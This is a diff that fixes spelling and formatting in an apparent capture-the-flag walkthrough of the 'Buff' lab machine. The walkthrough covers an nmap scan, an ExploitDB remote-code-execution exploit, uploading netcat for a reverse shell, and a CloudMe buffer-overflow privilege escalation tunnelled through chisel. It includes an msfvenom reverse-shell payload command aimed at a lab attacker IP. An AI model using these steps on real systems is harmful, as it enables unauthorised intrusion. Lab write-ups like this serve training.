@@ -15,7 +15,7 @@ description: >-
 
 Buff is an easy windows machine that runs a gym managment web interface tha't outdated and has a known exploit to get RCE on the box. From here we are using winPEAS to locate `CloudMe.exe` which is vulnerable to buffer overflow. Using some port forwarding and the found oython exploit we get administration rights on the box.
 
-## Usefull Tools
+## Useful Tools
 
 1. chisel  [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
 
@@ -23,7 +23,7 @@ Buff is an easy windows machine that runs a gym managment web interface tha't ou
 
 ### Nmap
 
-As always the first thing is enumerating the box with nmap. The most efficient flags that I found that work relatively fast and at the same time don't skip important infrmation are `-Pn` to skip the ping test, `-sS` foTCP SYN scan, `-sC` for teting default scripts, `-sV` for version enumeration of the host, `-T4` to be fast and `-p-` to do an all ports scan. Also to not waste time I like to use the `--max-retries 0` to stop nmap from testing the same port multiple times.
+As always the first thing is enumerating the box with nmap. The most efficient flags that I found that work relatively fast and at the same time don't skip important information are `-Pn` to skip the ping test, `-sS` foTCP SYN scan, `-sC` for teting default scripts, `-sV` for version enumeration of the host, `-T4` to be fast and `-p-` to do an all ports scan. Also to not waste time I like to use the `--max-retries 0` to stop nmap from testing the same port multiple times.
 
 ```bash
 dec1pher@kali:~$ sudo nmap -Pn -sS -sC -sV -T4 -p- 10.10.10.198 --max-retries 0
@@ -49,35 +49,47 @@ There is only one port open according to the initial scan and it's an Apache web
 
 ### Site discovery \(HTTP 8080\)
 
-The website is a gym managment app and going though the pages we can see in the `contact.php` page the version and the name of the software that's used.
+The website is a gym management app and going though the pages we can see in the `contact.php` page the version and the name of the software that's used.
 
 ![](../../.gitbook/assets/buff-site.png)
 
-That version of the app has a know vulnerabilty that gives RCE to the attacker and we can find the exploit python script in ExploitDB [https://www.exploit-db.com/exploits/48506](https://www.exploit-db.com/exploits/48506).
+That version of the app has a know vulnerability that gives RCE to the attacker and we can find the exploit python script in ExploitDB [https://www.exploit-db.com/exploits/48506](https://www.exploit-db.com/exploits/48506).
 
-### Exploiting Gym managment
+### Exploiting Gym management
 
-By running the exploit providing the box ip we get RCE on the box. The shell that the script opened is not responsive \(we can't change directories\) but we can run commands on the box. So we spin up a python server on our box and we upload `nc.exe` on the machine using `powershe Invoke-WebRequest` since we have access to powershell. Since `nc.exe` gets uploaded we can call it from the webshell we got from the python script and get a responsive reverse shell on the box \(since the nc.exe doesn't get deleted or blocked we can assume thatthe box doesn't have an antivirus or some kind of malware detection\). 1. Uploading `nc.exe` ![](../../.gitbook/assets/buff-nc.png) 2. Executing nc and getting a responsive reverse shell ![](../../.gitbook/assets/buff-rce.png)
+By running the exploit providing the box ip we get RCE on the box. The shell that the script opened is not responsive \(we can't change directories\) but we can run commands on the box. So we spin up a python server on our box and we upload `nc.exe` on the machine using `powershe Invoke-WebRequest` since we have access to powershell. Since `nc.exe` gets uploaded we can call it from the webshell we got from the python script and get a responsive reverse shell on the box \(since the nc.exe doesn't get deleted or blocked we can assume that the box doesn't have an antivirus or some kind of malware detection\).
+
+ 1. Uploading `nc.exe` 
+
+![](../../.gitbook/assets/buff-nc.png)
+
+2. Executing nc and getting a responsive reverse shell
+
+![](../../.gitbook/assets/buff-rce.png)
 
 =&gt; We can get user.txt under `C:\Users\Shaun\Desktop\user.txt`
 
-## Priviledge escalation
+## Privilege escalation
 
-After some manual enumeration on the use we can see an app that stickout `CloudMe.exe`. After searching for that app we can find that the version of that app is vulnerable to buffer overflow and we can find a python script in exploitdb that exploits the vulnerability.
+After some manual enumeration on the use we can see an app that stick out `CloudMe.exe`. After searching for that app we can find that the version of that app is vulnerable to buffer overflow and we can find a python script in exploitdb that exploits the vulnerability.
 
 > buffer overflow script found here =&gt; [https://www.exploit-db.com/exploits/48389](https://www.exploit-db.com/exploits/48389)
 
 ### Creating the payload and setting up Chisel to use the script
 
-Since python is not isntalled in the victim box we can use port forwarding to execute the script locally and send the payload to the victim using chisel. First we have to create a payload that opens a reverse TCP connection back to us. To do that we can use msfvenom and then use that created payload in the python script that we found.
+Since python is not installed in the victim box we can use port forwarding to execute the script locally and send the payload to the victim using chisel. First we have to create a payload that opens a reverse TCP connection back to us. To do that we can use msfvenom and then use that created payload in the python script that we found.
 
 =&gt; To create the payload `sudo msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.14.103 LPORT=1337 -f py -v payload`
 
-Our next move is to upload `chisel.exe` on the victim using `powershell IWR` and run it in client mode , open chisel locally in server mode on the same ports to get a connection from our machine to the victim machine and finaly forward the payload to the port that the app is running.
+Our next move is to upload `chisel.exe` on the victim using `powershell IWR` and run it in client mode , open chisel locally in server mode on the same ports to get a connection from our machine to the victim machine and finally forward the payload to the port that the app is running.
 
-=&gt; Locally open chisel in server mode ![](../../.gitbook/assets/buff-client-chisel.png)
+=&gt; Locally open chisel in server mode
 
-=&gt; Remotely execute chisel in client mode ![](../../.gitbook/assets/buff-serverchisel.png)
+![](../../.gitbook/assets/buff-client-chisel.png)
+
+=&gt; Remotely execute chisel in client mode
+
+![](../../.gitbook/assets/buff-serverchisel.png)
 
 So we have created the tunnel to forward the payload to the app so now we can execute the python script that sends the payload open a netcat listener and get administration access on the box.
 
